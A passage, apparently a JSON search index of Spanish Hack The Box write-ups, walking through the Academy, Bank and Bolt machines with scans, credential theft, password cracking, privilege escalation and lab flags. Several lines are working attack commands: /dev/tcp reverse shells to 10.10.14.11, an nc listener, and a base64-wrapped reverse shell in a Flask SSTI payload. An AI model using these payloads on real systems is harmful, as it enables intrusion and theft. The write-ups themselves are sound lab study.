eyJpdiI6IndKMW92NHM3MDFKbk9hd3l5Z0NxMVE9PSIsInZhbHVlIjoiK1NoVG5OTkVQSkxxV05hQmowRlRTVitzY0M0cWwxV0RJaXloVmJIR0dZanpoYTRROFNRZ01IeDRGdHdTQmpjelhucDlwekdzZVpzalNkUlpFekZkQkorcitYd2dTUmdxQXpsOU1USis5alhnd1hKcnZxRFVmaGtocmpvYmJ0bHdQNGtrRmNKU0lIdTcxUnZHZnRwblZSWDYyUk1EczVCdXJiSmdmYitCUzVkak5GV0lzRXdRYVpjYjhMRFpSMzZHdUwyQitZK0xTMDNxSFwvdE9KdWFCNFY0Z2tndnNEOVFueSs3OGFLXC9xK2VPSFwvMjRNcmlNRnpDMFBTR09LWmZ3aG9qZ0cxYXJlN3pMazhYdGxWVG1lZExtZzQydW5wdVNzNk9qTEFobFNzd01zWStLK01oeWFRK2ZwVzhhTEJGVlBrZ2FOZWlhZTJ5OGFuVzdpZ3FJb1padU5IZmNJWnZiQm9HMDgzZEN2RUlQRlpNSkY1K1k5OW9BNUU2OXFpUkl6IiwibWFjIjoiZTVjOTVlZmRlMDBhN2UxZjNhZDUwZGI2MDkxMzEyZDkyYjhiZGU0ZDBmZjViNzZhZTBiNTc3ZGJmMWE5NzEwOSJ9 curl -s http://dev-staging-01.academy.htb -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IndKMW92NHM3MDFKbk9hd3l5Z0NxMVE9PSIsInZhbHVlIjoiK1NoVG5OTkVQSkxxV05hQmowRlRTVitzY0M0cWwxV0RJaXloVmJIR0dZanpoYTRROFNRZ01IeDRGdHdTQmpjelhucDlwekdzZVpzalNkUlpFekZkQkorcitYd2dTUmdxQXpsOU1USis5alhnd1hKcnZxRFVmaGtocmpvYmJ0bHdQNGtrRmNKU0lIdTcxUnZHZnRwblZSWDYyUk1EczVCdXJiSmdmYitCUzVkak5GV0lzRXdRYVpjYjhMRFpSMzZHdUwyQitZK0xTMDNxSFwvdE9KdWFCNFY0Z2tndnNEOVFueSs3OGFLXC9xK2VPSFwvMjRNcmlNRnpDMFBTR09LWmZ3aG9qZ0cxYXJlN3pMazhYdGxWVG1lZExtZzQydW5wdVNzNk9qTEFobFNzd01zWStLK01oeWFRK2ZwVzhhTEJGVlBrZ2FOZWlhZTJ5OGFuVzdpZ3FJb1padU5IZmNJWnZiQm9HMDgzZEN2RUlQRlpNSkY1K1k5OW9BNUU2OXFpUkl6IiwibWFjIjoiZTVjOTVlZmRlMDBhN2UxZjNhZDUwZGI2MDkxMzEyZDkyYjhiZGU0ZDBmZjViNzZhZTBiNTc3ZGJmMWE5NzEwOSJ9'| head -n 1 nc -lvnp 443 www-data@academy:/home$ whoami www-data","title":"Explotation - Intrusion"},{"location":"maquinas/linux/academy/#lateral-movement","text":"Se inspeccionan archivos y configuraciones: www-data@academy:/var/www/html/academy/public$ cat config.php <?php ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); $link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy'); ?> www-data@academy:/var/www/html/academy$ cat .env APP_NAME=Laravel APP_ENV=local APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= APP_DEBUG=false APP_URL=http://localhost LOG_CHANNEL=stack DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=academy DB_USERNAME=dev DB_PASSWORD=mySup3rP4s5w0rd!! Revisando la bbdd se encuentra un hash que podr\u00eda ser interesante, pero no sirve: mysql> select * from users; +----+-----------------------------------+----------------------------------+--------+---------------------+ | id | username | password | roleid | created_at | +----+-----------------------------------+----------------------------------+--------+---------------------+ | 5 | dev | a317f096a83915a3946fae7b7f035246 | 0 | 2020-08-10 23:36:25 | Se accede a otra sesi\u00f3n como cry0l1t3 con la password mySup3rP4s5w0rd!! y al estar en el grupo adm investigamos logs: cry0l1t3@academy:/var/log/audit$ grep -ri 'data=' | awk '{print $NF}'| awk 'FS=\"=\" {print $2}'| xxd -ps -r | less -S mrb3n_Ac@d3my! whoami exit /bin/bash -i Se accede como mrb3n con password mrb3n_Ac@d3my! : cry0l1t3@academy:/var/log/audit$ su mrb3n Password: $ whoami mrb3n","title":"Lateral Movement"},{"location":"maquinas/linux/academy/#escalate-privileges-root","text":"Desde el usuario mrb3n se encuentran comandos que se puede ejecutan con sudo, se aprovecha para escalar: mrb3n@academy:/var/www/html/htb-academy-dev-01$ sudo -l [sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mrb3n may run the following commands on academy: (ALL) /usr/bin/composer mrb3n@academy:/var/www/html/htb-academy-dev-01$ sudo /usr/bin/composer exec chmod 4755 /bin/bash PHP Warning: PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 PHP Warning: PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 Do not run Composer as root/super user! See https://getcomposer.org/root for details mrb3n@academy:/var/www/html/htb-academy-dev-01$ /bin/bash -p bash-5.0# whoami oot bash-5.0# cat /root/root.txt **1d0792525f28ddb9a968d7996a285dfc**","title":"Escalate Privileges (root)"},{"location":"maquinas/linux/bank/","text":"Bank HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.29 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.29 Se realiza un analisis de los puertos abiertos: nmap -sCV -p22,53,80 10.10.10.29 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 14:37 CEST Nmap scan report for 10.10.10.29 Host is up (0.036s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA) | 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA) | 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA) |_ 256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519) 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.7 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds Se realiza un fuzzing de directorios: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://bank.htb/FUZZ' -e .php,.htb -t 300 -r /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://bank.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .php .htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 300 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ uploads [Status: 403, Size: 283, Words: 21, Lines: 11, Duration: 42ms] assets [Status: 200, Size: 1696, Words: 112, Lines: 21, Duration: 38ms] inc [Status: 200, Size: 1530, Words: 100, Lines: 20, Duration: 130ms] logout.php [Status: 200, Size: 1974, Words: 595, Lines: 52, Duration: 6883ms] .php [Status: 403, Size: 279, Words: 21, Lines: 11, Duration: 270ms] .htb [Status: 403, Size: 279, Words: 21, Lines: 11, Duration: 272ms] [Status: 200, Size: 1974, Words: 595, Lines: 52, Duration: 183ms] server-status [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 56ms] balance-transfer [Status: 200, Size: 253503, Words: 13039, Lines: 1015, Duration: 177ms] Muy interesante el directorio balance-transfer, contiene un listado de transaciones, con credenciales cifradas: ++OK ENCRYPT SUCCESS +=================+ | HTB Bank Report | +=================+ ===UserAccount=== Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi CreditCards: 5 Transactions: 93 Balance: 905948 . ===UserAccount=== Explotation - Intrusion Sin embargo si ordenamos por tama\u00f1o y abrimos el m\u00e1s peque\u00f1o, obtenemos esta sorpresa que nos permite acceder http://bank.htb/login.php: --ERR ENCRYPT FAILED +=================+ | HTB Bank Report | +=================+ ===UserAccount=== Full Name: Christos Christopoulos Email: chris@bank.htb Password: !##HTBB4nkP4ssw0rd!## CreditCards: 5 Transactions: 39 Balance: 8842803 . ===UserAccount=== Dentro la p\u00e1gina existe un link que permite subir ficheros http://bank.htb/support.php. Leyendo el c\u00f3digo vemos que hay una funci\u00f3n que habilita los archivos extensi\u00f3n .htb para ejecuci\u00f3n como php. Se sube una shell, y se realiza una enumeraci\u00f3n b\u00e1sica: p0wny@shell:/home/chris# cat user.txt 71b2bf7953fa5b87957dce9e077101a9 p0wny@shell:/var/htb# ls -la total 16 drwxr-xr-x 3 root root 4096 Jan 11 2021 . drwxr-xr-x 14 root root 4096 Jan 11 2021 .. drwxr-xr-x 2 root root 4096 Jan 11 2021 bin -rwxr-xr-x 1 root root 356 Jun 14 2017 emergency p0wny@shell:\u2026/htb/bin# bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1' Escalate Privileges - www-data => root Se observa una plantilla de un script en python, y luego en el directorio \"bin\" el binario con privilegios de suid: www-data@bank:/var/htb$ cat emergency #!/usr/bin/python import os, sys def close(): print \"Bye\" sys.exit() def getroot(): try: print \"Popping up root shell..\"; os.system(\"/var/htb/bin/emergency\") close() except: sys.exit() q1 = raw_input(\"[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: \"); if q1 == \"y\" or q1 == \"yes\": getroot() else: close() www-data@bank:/var/htb/bin$ ls -la total 120 drwxr-xr-x 2 root root 4096 Jan 11 2021 . drwxr-xr-x 3 root root 4096 Jan 11 2021 .. -rwsr-xr-x 1 root root 112204 Jun 14 2017 emergency www-data@bank:/var/htb/bin$ ./emergency # whoami root # cat /root/root.txt ea7e4198a998f8e5dad4e7c75b98d981","title":"Bank"},{"location":"maquinas/linux/bank/#bank-htb","text":"","title":"Bank HTB"},{"location":"maquinas/linux/bank/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.29","title":"Recon"},{"location":"maquinas/linux/bank/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.29 Se realiza un analisis de los puertos abiertos: nmap -sCV -p22,53,80 10.10.10.29 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 14:37 CEST Nmap scan report for 10.10.10.29 Host is up (0.036s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA) | 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA) | 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA) |_ 256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519) 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.7 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds Se realiza un fuzzing de directorios: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://bank.htb/FUZZ' -e .php,.htb -t 300 -r /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://bank.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .php .htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 300 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ uploads [Status: 403, Size: 283, Words: 21, Lines: 11, Duration: 42ms] assets [Status: 200, Size: 1696, Words: 112, Lines: 21, Duration: 38ms] inc [Status: 200, Size: 1530, Words: 100, Lines: 20, Duration: 130ms] logout.php [Status: 200, Size: 1974, Words: 595, Lines: 52, Duration: 6883ms] .php [Status: 403, Size: 279, Words: 21, Lines: 11, Duration: 270ms] .htb [Status: 403, Size: 279, Words: 21, Lines: 11, Duration: 272ms] [Status: 200, Size: 1974, Words: 595, Lines: 52, Duration: 183ms] server-status [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 56ms] balance-transfer [Status: 200, Size: 253503, Words: 13039, Lines: 1015, Duration: 177ms] Muy interesante el directorio balance-transfer, contiene un listado de transaciones, con credenciales cifradas: ++OK ENCRYPT SUCCESS +=================+ | HTB Bank Report | +=================+ ===UserAccount=== Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi CreditCards: 5 Transactions: 93 Balance: 905948 . ===UserAccount===","title":"Enum"},{"location":"maquinas/linux/bank/#explotation-intrusion","text":"Sin embargo si ordenamos por tama\u00f1o y abrimos el m\u00e1s peque\u00f1o, obtenemos esta sorpresa que nos permite acceder http://bank.htb/login.php: --ERR ENCRYPT FAILED +=================+ | HTB Bank Report | +=================+ ===UserAccount=== Full Name: Christos Christopoulos Email: chris@bank.htb Password: !##HTBB4nkP4ssw0rd!## CreditCards: 5 Transactions: 39 Balance: 8842803 . ===UserAccount=== Dentro la p\u00e1gina existe un link que permite subir ficheros http://bank.htb/support.php. Leyendo el c\u00f3digo vemos que hay una funci\u00f3n que habilita los archivos extensi\u00f3n .htb para ejecuci\u00f3n como php. Se sube una shell, y se realiza una enumeraci\u00f3n b\u00e1sica: p0wny@shell:/home/chris# cat user.txt 71b2bf7953fa5b87957dce9e077101a9 p0wny@shell:/var/htb# ls -la total 16 drwxr-xr-x 3 root root 4096 Jan 11 2021 . drwxr-xr-x 14 root root 4096 Jan 11 2021 .. drwxr-xr-x 2 root root 4096 Jan 11 2021 bin -rwxr-xr-x 1 root root 356 Jun 14 2017 emergency p0wny@shell:\u2026/htb/bin# bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'","title":"Explotation - Intrusion"},{"location":"maquinas/linux/bank/#escalate-privileges-www-data-root","text":"Se observa una plantilla de un script en python, y luego en el directorio \"bin\" el binario con privilegios de suid: www-data@bank:/var/htb$ cat emergency #!/usr/bin/python import os, sys def close(): print \"Bye\" sys.exit() def getroot(): try: print \"Popping up root shell..\"; os.system(\"/var/htb/bin/emergency\") close() except: sys.exit() q1 = raw_input(\"[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: \"); if q1 == \"y\" or q1 == \"yes\": getroot() else: close() www-data@bank:/var/htb/bin$ ls -la total 120 drwxr-xr-x 2 root root 4096 Jan 11 2021 . drwxr-xr-x 3 root root 4096 Jan 11 2021 .. -rwsr-xr-x 1 root root 112204 Jun 14 2017 emergency www-data@bank:/var/htb/bin$ ./emergency # whoami root # cat /root/root.txt ea7e4198a998f8e5dad4e7c75b98d981","title":"Escalate Privileges - www-data =&gt; root"},{"location":"maquinas/linux/bolt/","text":"Bolt HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.114 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.114 Se realiza un scan de los puertos abiertos: nmap -sVC -p22,80,443 10.10.11.114 -oN openPorts PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Starter Website - About |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.18.0 (Ubuntu) Subdomain fuzzing: # Se encuentran y a\u00f1aden dos nuevos subdominios demo y mail > gobuster vhost -u http://bolt.htb -w /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt -t 100 =============================================================== Gobuster v3.1.0 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @firefart ) =============================================================== [ + ] Url: http://bolt.htb [ + ] Method: GET [ + ] Threads: 100 [ + ] Wordlist: /usr/share/wordlists/SecLists-2021.2/Discovery/DNS/subdomains-top1million-5000.txt [ + ] User Agent: gobuster/3.1.0 [ + ] Timeout: 10s =============================================================== 2022 /09/24 14 :41:17 Starting gobuster in VHOST enumeration mode =============================================================== Found: demo.bolt.htb ( Status: 302 ) [ Size: 219 ] Found: mail.bolt.htb ( Status: 200 ) [ Size: 4943 ] Admin password # Descargamos la imagen y se encuentra un hash de admin que se puede crackear: > wget http://bolt.htb/download/image.tar > strings image.tar | grep bolt.htb {} @bolt.htb support@bolt.htbz#Please confirm your profile changes DEFAULT_MAIL_SENDER = 'support@bolt.htb' support@bolt.htb ) adminadmin@bolt.htb $1$sm1RceCh$rSd3PygnS /6jlFDfF2J5q. ) admin@bolt.htbroot/ > john --wordlist = /usr/share/wordlists/rockyou.txt hash_des_unix Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 256 /256 AVX2 8x3 ]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status deadbolt ( ? ) 1g 0 :00:00:01 DONE ( 2022 -09-24 00 :43 ) 0 .8620g/s 148965p/s 148965c/s 148965C/s debie..curtis13 Use the \"--show\" option to display all of the cracked passwords reliably Session completed # Acceso al panel http://bolt.htb/admin/home admin:deadbolt SSTI - Gaining Access (www-data) En la p\u00e1gina demo.bolt.htb hay un apartado de registro pero con invitaci\u00f3n, revisando el c\u00f3digo se puede ver dicha key: grep -ri \"invite_code\" base/forms.py: invite_code = TextField ( 'Invite Code' , id = 'invite_code' , validators =[ DataRequired ()]) base/routes.py: code = request.form [ 'invite_code' ] base/templates/accounts/register.html: {{ form.invite_code ( placeholder = \"Invite Code\" , class = \"form-control\" ) }} cat routes.py | grep code stored_password = stored_password.decode ( 'utf-8' ) code = request.form [ 'invite_code' ] if code ! = 'XNSS-HSJW-3NGU-8XTJ' : return render_template ( 'code-500.html' ) if data is None and code == 'XNSS-HSJW-3NGU-8XTJ' : Tras crear un usuario, autom\u00e1ticamente te genera un correo con la misma password al cual se puede acceder por la url http://mail.bolt.htb. En la web demo.bolt.htb hay un SSTI en settings y te manda la confirmaci\u00f3n para aceptar los cambios y el output por correo: echo 'bash -c \"bash -i >& /dev/tcp/10.10.14.11/4443 0>&1\"' | base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDQzIDA+JjEiCg == # Payload probado en diferentes campos: { \"siteurl\" : \"{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDQzIDA+JjEiCg==| base64 -d | bash').read()}}\" } www-data@bolt:~/demo$ whoami www-data www-data@bolt:~/demo$ cat config.py \"\"\"Flask Configuration\"\"\" #SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db' SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail' SQLALCHEMY_TRACK_MODIFICATIONS = True SECRET_KEY = 'kreepandcybergeek' MAIL_SERVER = 'localhost' MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False #MAIL_DEBUG = app.debug MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = 'support@bolt.htb' www-data@bolt:/opt/google/chrome$ mysql -h localhost -u bolt_dba -p -D boltmail Enter password: dXUUHSW9vBpH5qRB Movimiento lateral => user eddie Con linpeas se encuentran leaks de passwords: # linpeas resultados: 'host' = > 'localhost' , 'port' = > '3306' , 'username' = > 'passbolt' , 'password' = > 'rT2;jW7<eY8!dX8}pQ8%' , 'database' = > 'passboltdb' , # Acceso a la base de datos, se obtiene un correo cifrado con gpg: www-data@bolt:/dev/shm$ mysql -h localhost -u passbolt -p Enter password: rT2 ; jW7<eY8!dX8 } pQ8% | 643a8b12-c42c-4507-8646-2f8712af88f8 | 4e184ee6-e436-47fb-91c9-dccb57f250bc | cd0270db-c83f-4f44-b7ac-76609b397746 | -----BEGIN PGP MESSAGE----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7 FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov 8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey 5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6 TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984 = P38i -----END PGP MESSAGE----- # Reutilizaci\u00f3n de contrase\u00f1a de eddie (rT2;jW7<eY8!dX8}pQ8%) eddie@bolt:~$ cat user.txt 10fb73a66c95c4e66a6fbdea39a570b2 GPG abuse - Escalate priv to root Se encuentra un mensajito de clark donde se habla de la importancia de una clave privada: eddie@bolt:~/.pki$ cat /var/mail/eddie From clark@bolt.htb Thu Feb 25 14 :20:19 2021 Return-Path: <clark@bolt.htb> X-Original-To: eddie@bolt.htb Delivered-To: eddie@bolt.htb Received: by bolt.htb ( Postfix, from userid 1001 ) id DFF264CD ; Thu, 25 Feb 2021 14 :20:19 -0700 ( MST ) Subject: Important! To: <eddie@bolt.htb> X-Mailer: mail ( GNU Mailutils 3 .7 ) Message-Id: < 20210225212019 .DFF264CD@bolt.htb> Date: Thu, 25 Feb 2021 14 :20:19 -0700 ( MST ) From: Clark Griswold <clark@bolt.htb> Hey Eddie, The password management server is up and running. Go ahead and download the extension to your browser and get logged in . Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account. Once you 're set up you can start importing your passwords. Please be sure to keep good security in mind - there' s a few things I read about in a security whitepaper that are a little concerning... -Clark Se encuentra la clave privada en un archivo de logs de los directorios del home del usuario: # Se hashea para crackear: > gpg2john gpg_key_eddie File gpg_key_eddie Eddie Johnson: $gpg$* 1 *668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson <eddie@bolt.htb>::gpg_key_eddie # Se crackea el hash de la clave privada, tarda bastante: john --wordlist = /usr/share/wordlists/rockyou.txt hash_eddie --format = gpg Using default input encoding: UTF-8 Loaded 1 password hash ( gpg, OpenPGP / 